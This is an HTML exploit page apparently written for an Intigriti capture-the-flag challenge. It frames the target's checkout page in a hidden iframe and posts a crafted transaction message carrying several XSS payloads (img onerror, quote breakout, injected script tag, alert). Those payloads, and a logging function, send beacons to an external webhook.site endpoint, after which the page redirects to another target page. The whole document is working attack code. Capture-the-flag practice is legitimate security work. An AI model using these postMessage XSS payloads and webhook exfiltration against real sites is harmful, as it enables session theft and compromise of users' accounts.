<!DOCTYPE html>
<html>
<head><title>FINAL</title></head>
<body>
<div id="log"></div>
<script>
const T = 'https://challenge-0126.intigriti.io';
const W = 'https://webhook.site/247d45dd-5ceb-4726-b948-49b69a259138';
const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';
let s = 0;

function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?step='+s+'&msg='+encodeURIComponent(m); }

async function exploit() {
    log('STARTING');

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
    document.body.appendChild(iframe);

    await new Promise(r => iframe.onload = r);
    await new Promise(r => setTimeout(r, 3000));
    log('Checkout loaded');

    // Try adding nickname field to postMessage
    log('Sending with nickname field...');
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: WALLET,
            currency: '1337COIN',
            amount: 1,
            nickname: '<img src=x onerror="fetch(\''+W+'/?nickname_xss=1\',{mode:\'no-cors\'})">',
            fromAddress: `');fetch('${W}/?from_xss=1',{mode:'no-cors'});//`,
            memo: `<script>fetch('${W+'/?memo_xss=1'}',{mode:'no-cors'})<\/script>`,
            note: '\';alert(1);//'
        }
    }, '*');
    log('Sent');

    await new Promise(r => setTimeout(r, 3000));
    log('Redirecting to marketwatch...');
    window.location.href = T + '/marketwatch.html';
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
